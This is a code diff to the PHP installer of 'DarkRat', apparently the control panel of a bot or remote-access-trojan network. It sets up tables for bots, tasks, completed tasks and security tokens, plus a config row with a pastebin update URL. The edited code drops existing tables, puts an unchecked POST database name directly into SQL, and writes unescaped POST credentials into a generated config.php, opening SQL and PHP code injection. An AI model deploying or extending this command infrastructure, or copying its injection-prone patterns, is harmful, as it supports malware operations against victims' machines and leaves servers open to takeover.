@@ -16,30 +16,44 @@ class Install{
 
      public function index()
     {
-
+        //uUog~{qyTKN{
         if(!empty($_POST)){
-            $mysqldatabaseRand = $this->generateRandomString(2);
-            $mysqlpassword = $this->generateRandomString(20);
+                //$mysqldatabaseRand = $this->generateRandomString(2);
+               // $mysqlpassword = $this->generateRandomString(20);
                
-                if(empty($_POST["mysqlusername"]) || empty($_POST["mysqlpassword"])){
-                        die("Error Wrong Details");
+                if(empty($_POST["mysqlusername"]) || empty($_POST["mysqlpassword"]) || empty($_POST["databaseName"])){
+                    die("Error Wrong Details");
                 }
 
+                 $mysqldatabaseRand = $_POST["databaseName"];
+                 $mysqlpassword = $_POST["mysqlpassword"];
+                 $mysqlusername = $_POST["mysqlusername"];
 
-                try{
-                    $databaseCon = new PDO('mysql:host=localhost', $_POST["mysqlusername"], $_POST["mysqlpassword"]);
-                }catch(PDOException $e){
-                    die($e->getmessage());
-                }
+
+                    try{
+                        $databaseCon = new PDO('mysql:host=localhost', $_POST["mysqlusername"], $mysqlpassword);
+                    }catch(PDOException $e){
+                        die($e->getmessage());
+                    }
     
-   
-               $database = "
-                    SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';
+   /*
+    *
+    *               SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';
                     SET time_zone = '+00:00';
                     CREATE USER '".$mysqldatabaseRand."'@'localhost' IDENTIFIED BY  '".$mysqlpassword."';
                     GRANT USAGE ON *.* TO '".$mysqldatabaseRand."'@'localhost' REQUIRE NONE WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;
                     CREATE DATABASE IF NOT EXISTS `".$mysqldatabaseRand."`;GRANT ALL PRIVILEGES ON `".$mysqldatabaseRand."`.* TO '".$mysqldatabaseRand."'@'localhost';
                     USE ".$mysqldatabaseRand.";
+    *
+    */
+               $database = "
+                    USE ".$_POST["databaseName"].";
+                    DROP TABLE IF EXISTS config;
+                    DROP TABLE IF EXISTS securitytokens;
+                    DROP TABLE IF EXISTS bots;
+                    DROP TABLE IF EXISTS tasks;
+                    DROP TABLE IF EXISTS tasks_completed;
+                    DROP TABLE IF EXISTS users;
                     
                      CREATE TABLE `config` (
                       `id` int(11) NOT NULL,
@@ -48,8 +62,8 @@ class Install{
                       `useragent` varchar(255) DEFAULT NULL
                     ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
                             
-        INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`) VALUES
-        (1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret');
+                    INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`) VALUES
+                    (1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret');
 
                    ALTER TABLE `config`
                    ADD PRIMARY KEY (`id`);
@@ -120,16 +134,13 @@ class Install{
    
                    ALTER TABLE `tasks`
                    ADD PRIMARY KEY (`id`);
-   
                 
                    ALTER TABLE `tasks_completed`
                    ADD PRIMARY KEY (`id`);
-   
            
                    ALTER TABLE `users`
                    ADD PRIMARY KEY (`id`),
                    ADD UNIQUE KEY `username` (`username`);
-   
            
                    ALTER TABLE `bots`
                    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
@@ -149,16 +160,17 @@ class Install{
 
                 try{
                     $statement = $databaseCon->prepare($database);
-                    $statement->execute(array()); 
+                    $statement->execute(array());
+                    $databaseErrors = $statement->errorInfo();
                 }catch(PDOException $e){
                     die($e->getmessage());
                 }
-                $string = "<?php %pdo = new PDO('mysql:host=localhost;dbname=".$mysqldatabaseRand."', '".$mysqldatabaseRand."', '".$mysqlpassword."');";
+                $string = "<?php %pdo = new PDO('mysql:host=localhost;dbname=".$mysqldatabaseRand."', '".$mysqlusername."', '".$mysqlpassword."');";
                 file_put_contents(__DIR__."/../../../../../config.php",str_replace("%","$",$string));
 
- 
 
-                echo "
+                if($databaseErrors[2] == NULL){
+                    echo "
                 DarkRat is Installed<br>
                 Please Change Default Login in the Admin Center
                 <hr>
@@ -167,6 +179,9 @@ class Install{
                     <br>
                 <a href='/login'>Click Me to Login</a>
                 ";
+                }else{
+                    var_dump($databaseErrors);
+                }
                 die();
         }
 
